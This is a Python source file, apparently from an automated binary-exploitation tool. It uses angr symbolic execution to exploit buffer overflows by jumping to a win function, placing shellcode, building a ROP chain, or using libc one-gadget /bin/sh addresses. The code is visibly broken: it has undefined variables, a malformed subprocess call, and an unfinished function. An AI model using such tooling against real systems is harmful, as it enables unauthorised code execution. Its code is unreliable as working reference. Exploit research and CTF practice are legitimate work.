import angr
import claripy
import time
import timeout_decorator
import IPython
import r2pipe
import json
import os
import subprocess
from pwn import *
from struct import pack
from angr import sim_options as so
from vul_rules import puts_model, printf_model, malloc_model
from .simgr_helper import hook_four
import logging

log = logging.getLogger(__name__)

from .simgr_helper import (
	point_to_win_filter,
	point_to_shellcode_filter,
	point_to_ropchain_filter,
)
from .radare_helper import getRegValues, findShellcode, get_base_addr

def getOneGadget(properties):

    from subprocess import Popen, PIPE, STDOUT

    if "libc" not in properties or properties["libc"] is None:
        log.info("[-] One gadget RCE relies on libc. Please add libc")
        exit(0)
    if "libc_base" not in properties or properties["libc_base"] is None:
        log.info("[~] No libc base address specified. Chains will use 0x0 as base")

    # If installed using helper script, one gadget should be on $PATH
    one_gadget = Popen("one_gadget", properties["libc"], stdout=PIPE)
    lines = one_gadgets.stdout.communicate()[0].split("\n")

    gadget_addrs = []

    # Only grab the addresses
    for line in lines:
        if "/bin/sh" in line:
            log.info("[+] {}".format(line))
            gadget_addrs.append(line.split(" ")[0])

    return gadget_addrs

def exploitOverflow(binary_name, properties, inputType="STDIN"):
	run_environ = properties["overflow"].get("results", {})
	run_environ["type"] = run_environ.get("type", None)

	p = angr.Project(binary_name, load_options={"auto_load_libs": False})
	if properties.get("libc", None) and not isinstance(properties["libc"], dict):
		libc_base_addr = properties.get("libc_base_address", 0x500000)
		libc_base_name = os.path.basename(properties["libc"])
		p = angr.Project(
			binary,
			load_options={"auto_load_libs": False},
			force_load_libs=[properties["libc"]],
			lib_opts={libc_base_name: {"base_addr": libc_base_addr}},
		)
	if p.loader.main_object.pic:
		log.info("Binary is PIC getting base addr")
		base_addr = get_base_addr(binary_name)
		p = angr.Project(
			binary_name,
			load_options={
				"auto_load_libs": False,
				"main_opts": {"base_addr": base_addr},
			},
		)
	extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY, so.TRACK_CONSTRAINTS}

def pickFilter(simgr, properties):

    has_nx = properties.get("protections", {}).get("nx", True)
    force_shellcode = properties.get("force_shellcode", False)
    if properties.get("win_functions", None):
        log.info("[+] Using point to win function technique")
        return point_to_win_filter
    elif not has_nx and force_shellcode:
        log.info("[+] Binary does not have NX")
        log.info("[+] Placing shellcode and pointing")
        return point_to_shellcode_filter
    else:
        log.info("[+] Building rop and pointing")
        return point_to_ropchain_filter
    return None
